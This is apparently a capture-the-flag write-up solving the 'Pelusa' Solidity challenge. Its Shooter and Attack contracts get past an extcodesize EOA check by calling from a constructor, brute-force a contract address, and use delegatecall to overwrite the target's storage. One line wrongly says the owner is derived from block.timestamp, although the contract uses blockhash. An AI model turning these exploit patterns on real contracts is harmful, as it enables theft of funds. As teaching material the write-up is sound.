# Pelusa

## Challenge

We get one contract which we need to exploit

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IGame {
    function getBallPossesion() external view returns (address);
}

// "el baile de la gambeta"
// https://www.youtube.com/watch?v=qzxn85zX2aE
// @author https://twitter.com/eugenioclrc
contract Pelusa {
    address private immutable owner;
    address internal player;
    uint256 public goals = 1;

    constructor() {
        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
    }

    function passTheBall() external {
        require(msg.sender.code.length == 0, "Only EOA players");
        require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");

        player = msg.sender;
    }

    function isGoal() public view returns (bool) {
        // expect ball in owners posession
        return IGame(player).getBallPossesion() == owner;
    }

    function shoot() external {
        require(isGoal(), "missed");
				/// @dev use "the hand of god" trick
        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
        require(success, "missed");
        require(uint256(bytes32(data)) == 22_06_1986);
    }
}
```

The goal is to change the goals from 1 to 2.

## Solution

First you need to get the owner. You can do this by calculating the value from the address that called the constructor and the block.timestamp at the construction tx. 

Then i wrote a simple contract called Shooter. This contract calls the passTheBall functionality if his own address to mod 100 is 10 and sets himself as the player. It does this during the constructor so the require in pelusa doesn't fail, which checks the extcodesize. In addition this contract implements the IGame interface and returns the owner in case of a call to getBallPossesion. It also has a function for handOfGod() which sets goals to 2 and returns the wanted value.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./Pelusa.sol";

contract Shooter
{
    address private immutable owner;
    address internal player;
    uint256 public goals;

    //The real owner is the one who deployed the contract, could be retrieved via etherscan or a web3 script scraping for the contract creation transaction
    constructor(address target, address _owner) 
    {
        owner = _owner;
        if (uint160(address(this)) % 100 == 10)
        {
            Pelusa(target).passTheBall();
        }
    }

    function getBallPossesion() external view returns (address)
    {
        return owner;
    }

    function handOfGod() external returns (uint256)
    {
        goals = 2;
        return 22_06_1986;
    }
}
```

Then i wrote the exploit contract which produces shooters until it gets a valid address. Afterwards it calls the shoot function.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./Shooter.sol";

contract Attack
{
    function attack(address target, address real_owner) external
    {
        address last_created;
        while (uint160(last_created) % 100 != 10)
        {
            last_created = address(new Shooter(target, real_owner));
        }

        Pelusa(target).shoot();
    }
}
```

In our case the change of goals works, as our shooter contract is called through a delegatecall in the pelusa contract, the change of goals gets done in pelusas context.

I also added a POC, which you can find in the POC.sol file.

